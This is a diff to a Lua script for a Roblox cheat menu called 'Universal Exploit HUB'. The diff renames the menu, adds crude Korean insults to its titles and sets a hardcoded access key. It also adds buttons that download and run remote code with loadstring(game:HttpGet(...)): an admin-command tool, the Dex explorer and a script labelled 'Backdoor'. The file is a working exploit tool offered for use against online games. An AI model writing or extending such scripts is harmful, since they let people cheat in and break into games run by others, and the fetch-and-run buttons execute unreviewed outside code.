@@ -2,9 +2,9 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-    Name = "한울태권도 허브",
-    LoadingTitle = "한울 Fucking",
-    LoadingSubtitle = "by Taekwondo in Yongin",
+    Name = "Universal Exploit HUB",
+    LoadingTitle = "권력겜 Fucking",
+    LoadingSubtitle = "by DJP",
     ConfigurationSaving = {
        Enabled = true,
        FolderName = nil, -- Create a custom folder for your hub/game
@@ -17,10 +17,10 @@ local Window = Rayfield:CreateWindow({
     },
     KeySystem = true, -- Set this to true to use our key system
     KeySettings = {
-       Title = "한울 태권도 화이트 리스트 체크",
-       Subtitle = "한울 태권도 Key",
-       Note = "허브 키: Yongin",
-       FileName = "허브 Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+       Title = "화이트 리스트 체크",
+       Subtitle = "Universal Exploit Key",
+       Note = "HUB Key: Yongin",
+       FileName = "HUB Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
        SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
        GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
        Key = {"Yongin"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
@@ -28,13 +28,13 @@ local Window = Rayfield:CreateWindow({
  })
 
  Rayfield:Notify({
-    Title = "한울태권도 ㅈ까 용인이 더 좋아ㅉ",
-    Content = "한울태권도 ㅈ까",
+    Title = "권력겜 ㅈ까 논산이나 해ㅉ",
+    Content = "권력겜 ㅈ까",
     Duration = 5,
     Image = 13047715178,
     Actions = { -- Notification Buttons
        Ignore = {
-          Name = "한울태권도 허브!",
+          Name = "Universal Exploit HUB!",
           Callback = function()
        end
     },
@@ -102,5 +102,19 @@ local Window = Rayfield:CreateWindow({
     Name = "IY Admin",
     Callback = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+    end,
+ })
+
+ local Button = AdminTab:CreateButton({
+    Name = "Dex",
+    Callback = function()
+        loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
+    end,
+ })
+
+ local Button = AdminTab:CreateButton({
+    Name = "Backdoor",
+    Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
     end,
  })
